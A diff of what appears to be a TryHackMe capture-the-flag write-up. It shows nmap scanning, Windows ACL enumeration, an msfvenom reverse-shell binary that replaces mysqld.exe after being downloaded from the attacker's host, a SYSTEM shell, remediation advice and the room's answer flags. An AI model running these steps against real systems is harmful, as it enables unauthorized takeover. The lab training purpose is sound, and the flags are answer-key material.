@@ -58,7 +58,6 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 35.74 seconds
 zsh: segmentation fault  sudo nmap -sC -sV -T4 -A -O -Pn -n -sS 10.10.173.161
 
-
 ┌──(kali㉿kali)-[~]
 └─$ ping 10.10.173.161     
 PING 10.10.173.161 (10.10.173.161) 56(84) bytes of data.
@@ -85,7 +84,6 @@ Shellcodes: No Results
 File Type: Python script, ASCII text executable
 
 Copied to: /home/kali/47799.txt
-
 
                                                                                                          
 ┌──(kali㉿kali)-[~]
@@ -186,7 +184,6 @@ Enumeration
 
 One of the things to look for when enumerating windows for privilege escalation is an unquoted service path. Suppose a service has any spaces in the path to the executable file. In that case, unprivileged users can put a malicious file in the path, giving them SYSTEM privileges when the privileged user restarts the service. The script below looks for Win32 services on the host with unquoted service paths, not in the Windows folder.
 
-
 PS C:\Program Files\FreeSWITCH> Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -inotmatch "`"" -and $_.PathName -inotmatch ":\\Windows\\" }| Select Name,Pathname
 
 Name            Pathname                                                                                               
@@ -194,13 +191,11 @@ Name            Pathname
 OpenClinicHttp  c:\projects\openclinic\tomcat8\bin\tomcat8.exe //RS//OpenClinicHttp                                    
 OpenClinicMySQL c:\projects\openclinic\mariadb\bin\mysqld.exe --defaults-file=c:/projects/openclinic/mariadb/my.ini ...
 
-
 The search found two results, tomcat8.exe and mysqld.exe, both located in the C:\projects\openclinic\… directory. Unfortunately, there is no space in the path to both executables, so this is not very useful since I cannot poison the path. But neither of these files are standard to Windows, and appear to be sitting in a dedicated projects folder in the root directory, which shows some importance of this location and warrants additional investigation.
 
 The next step is to see what permissions the nekrotic user has on these files. We can enumerate the access control list using the following PowerShell command.
 
 PS C:\Program Files\FreeSWITCH> Get-Acl -Path "c:\projects\openclinic\mariadb\bin\mysqld.exe" | select *
-
 
 PSPath                  : Microsoft.PowerShell.Core\FileSystem::C:\projects\openclinic\mariadb\bin\mysqld.exe
 PSParentPath            : Microsoft.PowerShell.Core\FileSystem::C:\projects\openclinic\mariadb\bin
@@ -235,9 +230,7 @@ AreAuditRulesCanonical  : True
 
 Next, I enumerate the parent directories in the path to see if the nekrotic user has a write or modify permissions. If the target file has inherited the parent directory's permissions, it will allow me to modify the target file. We can check the file inheritance using the following PowerShell script.
 
-
 PS C:\Program Files\FreeSWITCH> (Get-Acl -Path "c:\projects\openclinic\mariadb\bin\mysqld.exe").access
-
 
 FileSystemRights  : FullControl
 AccessControlType : Allow
@@ -260,11 +253,9 @@ IsInherited       : True
 InheritanceFlags  : None
 PropagationFlags  : None
 
-
 The result shows that ACLs are inherited from the parent directory. So onwards with enumeration.
 
 PS C:\Program Files\FreeSWITCH> get-acl c:\projects | select *
-
 
 PSPath                  : Microsoft.PowerShell.Core\FileSystem::C:\projects
 PSParentPath            : Microsoft.PowerShell.Core\FileSystem::C:\
@@ -297,13 +288,11 @@ AreAuditRulesProtected  : False
 AreAccessRulesCanonical : True
 AreAuditRulesCanonical  : True
 
-
 Looking through the path, it appears that nekrotic have full read-write-execute permissions on the parent C:\projects directory. If the current user can modify files in the directory, an attacker can change one of any executables in the directory because they have inherited properties.
 
 msfvenom
 
 MsfVenom is "a Metasploit standalone generator" from Offensive Security, and we can use it to create binary to gain reverse shell as a system administrator on the target host. The following MsfVenom command creates windows reverse shell executable file, with the attacker's IP and port as the target. Since we are trying to replace the mysqld.exe file, we can pipe it into a file with that filename.
-
 
                                                                                                          
 ┌──(kali㉿kali)-[~]
@@ -334,8 +323,6 @@ PS C:\projects\openclinic\mariadb\bin> rename-item mysqld.exe mysqld_old.exe
 [Sun Sep 25 17:08:15 2022] 10.10.51.164:49834 [200]: GET /mysqld.exe
 [Sun Sep 25 17:08:16 2022] 10.10.51.164:49834 Closing
 
-
-
 PS C:\projects\openclinic\mariadb\bin> Invoke-webrequest -uri http://10.18.1.77:3000/mysqld.exe -outfile mysqld.exe
 PS C:\projects\openclinic\mariadb\bin> restart-computer
 
@@ -355,15 +342,11 @@ nt authority\system
 
 Success! I am now connected as NT Authorit
 
-
-
-
 Foothold was made possible on this machine because the default password was never changed. Attackers have used default passwords to control millions of devices, enabling them to create botnets. This vulnerability can be mitigated by changing the default password during setup. Developers must also make complex passwords requirements during setup.
 
 Privilege escalation was possible through unintended file permissions. Administrators must configure ACLs to ensure inherited file permissions do not give lower privileged users the ability to manipulate files.
 
 The last observation is about the process of penetration testing. It is a windy road. While looking for a path for privilege escalation, I started by looking for services with an unquoted file path to their executables. However, I used improperly implemented ACLs to gain system access successfully.
-
 
 C:\Windows\system32>cd C:\Users\Nekrotic\Desktop
 cd C:\Users\Nekrotic\Desktop
@@ -390,19 +373,12 @@ C:\Users\Nekrotic\Desktop>more root.txt
 more root.txt
 THM{8c8bc5558f0f3f8060d00ca231a9fb5e} 
 
-
 ```
-
-![[Pasted image 20220925153417.png]]
-
 
 What is the user.txt flag?
 *THM{64bca0843d535fa73eecdc59d27cbe26} *
 
-
-
 What is the root.txt flag?
 *THM{8c8bc5558f0f3f8060d00ca231a9fb5e}*
-
 
 [[Fowsniff CTF]]
